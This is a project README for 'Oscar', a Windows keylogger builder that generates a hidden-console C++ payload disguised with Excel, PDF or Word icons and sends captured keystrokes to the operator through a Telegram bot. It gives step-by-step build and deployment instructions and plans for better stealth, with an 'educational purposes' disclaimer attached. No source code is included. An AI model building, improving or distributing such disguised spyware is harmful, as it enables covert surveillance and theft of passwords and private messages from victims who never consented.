<p align="center">
  <img src="https://i.imgur.com/uAcYBFj.gif" width="850">
</p>

<h1 align="center">Oscar Keylogger</h1>

<p align="center">
  <img src="https://img.shields.io/badge/platform-Windows-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/language-Python%20%2B%20C++-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/status-Archived-yellow?style=for-the-badge">
  <img src="https://img.shields.io/badge/origin-2022-darkred?style=for-the-badge">
</p>

<p align="center">
  <i>"There's chaos in you."</i>
</p>

---

# Oscar

Oscar is an old personal cybersecurity project originally started around **2022** — back when AI assistants weren't writing code, auto-completing architecture, or explaining bugs in seconds.

Everything here was built through:
- trial and error
- documentation digging
- broken builds
- random Stack Overflow threads
- and long nights staring at terminal windows

At the time, even the keylogging logic itself was originally handled entirely in Python.

As programming knowledge improved over time, the project slowly evolved:
- Python became the builder/configuration layer
- C++ replaced the logging core for better performance and lower overhead
- the payload structure became cleaner and more modular

This repository is basically a snapshot of that learning curve.

Not perfect.
Not modern.
But real.

---

# Disclaimer

This repository exists strictly for:
- educational purposes
- malware analysis research
- authorized security testing

Unauthorized monitoring, logging, or access to systems you do not own or have explicit permission to test is illegal and unethical.

The author assumes no responsibility for misuse or damages caused by this project.

---

# Features

- Lightweight C++ keylogging payload
- Telegram-based log delivery
- Python builder interface
- Hidden console window
- Custom executable icons
  - Excel
  - PDF
  - Word
  - and more...
- Simple payload generation workflow
- Minimal dependencies
- Old-school builder style

---

# Why "Oscar"?

When development first started, the *Moon Knight* series had just released.

Oscar Isaac was everywhere.

The name stuck.

No deeper meaning than that.

Just nostalgia from a different era of coding.

---

# Current Status

> ⚠️ Project inactive for around 1–2 years.

This repository is currently archived in its old state.

A future rewrite may include:
- cleaner architecture
- better stealth techniques
- Linux support
- encryption
- modular payload system
- improved UI/UX

But for now, this project remains mostly as it originally was:
a record of experimentation, learning, and curiosity.

---

# Requirements

## Supported OS
- Windows

## Dependencies

- Python 3.8+
- Git
- MinGW (g++)
- libcurl
- Python packages from `requirements.txt`

---

# Installation

## Clone the repository

```bash
git clone https://github.com/Arash-abraham/Oscar.git
cd Oscar
```

---

## Install Python dependencies

```bash
pip install -r requirements.txt
```

---

## Install MinGW

Download:
https://www.mingw-w64.org/

Verify installation:

```bash
g++ --version
```

---

## Install libcurl

Clone vcpkg:

```bash
git clone https://github.com/microsoft/vcpkg.git
cd vcpkg
```

Install curl:

```bash
./vcpkg install curl
```

Verify installation:

```bash
pkg-config --modversion libcurl
```

---

# Usage

## Create a Telegram Bot

Use:
- `@BotFather` → obtain your Bot Token
- `@userinfobot` → obtain your Chat ID

---

## Launch Oscar

```bash
python Oscar.py
```

You will be prompted to:
- enter payload name
- enter Telegram Bot Token
- enter Chat ID
- select executable icon

Generated executable:

```bash
dist/<payload_name>.exe
```

---

## Run the payload

```bash
./dist/<payload_name>.exe
```

---

# Project Structure

```bash
Oscar/
│
├── CPP-Payload/
│   └── keylog.cpp
│
├── icon/
│   ├── excel.ico
│   ├── pdf.ico
│   ├── word.ico
│   └── ...
│
├── modules/
│   ├── banner.py
│   └── gnt.py
│
├── Oscar.py
├── README.md
└── requirements.txt
```

---

# Troubleshooting

## g++ not detected

```bash
g++ --version
```

---

## libcurl issues

```bash
pkg-config --modversion libcurl
```

---

## Icon not applied

Verify icon files exist inside the `icon/` directory.

---

## Telegram logs not sending

Double-check:
- Bot Token
- Chat ID
- Internet connection

---

# Security Notes

- Never expose your Telegram Bot Token
- Use only in authorized environments
- Respect local laws and regulations

---

# Final Note

This project was written during a very different time.

Before AI-generated repositories.
Before one-click copilots.
Before everything became optimized.

Just curiosity, caffeine, broken code, and persistence.

And honestly, that era had its own charm.

---

# Contact

📧 arashebi777@gmail.com

---

<p align="center">
  <i>Hack responsibly.</i>
</p>
